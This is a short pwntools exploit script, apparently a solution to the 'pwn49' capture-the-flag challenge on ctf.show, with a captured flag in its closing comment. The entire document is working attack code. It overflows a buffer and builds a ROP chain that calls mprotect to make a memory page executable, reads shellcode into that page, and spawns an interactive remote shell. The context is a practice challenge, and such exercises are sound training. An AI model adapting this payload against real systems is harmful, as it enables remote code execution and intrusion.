#pwn49 statically linked mprotect
from pwn import *
from requests.utils import extract_zipped_paths

e = ELF("./pwn")
p = remote("pwn.challenge.ctf.show",28259)

offset = 0x12 + 0x4
eax_addr = 0x08056194
mp_addr = 0x0806cdd0
got_addr = 0x080da000
read_addr = 0x0806bee0
shellcode = asm(shellcraft.sh())

payload = b'a' * offset + p32(mp_addr) + p32(eax_addr) + p32(got_addr) + p32(0x1000) + p32(0x7) + p32(read_addr)
payload += p32(got_addr) + p32(0) + p32(got_addr) + p32(len(shellcode))

p.sendline(payload)
p.sendline(shellcode)
p.interactive()
#ctfshow{c85a9f52-2e6b-40fd-bbad-22d833a0ea3a}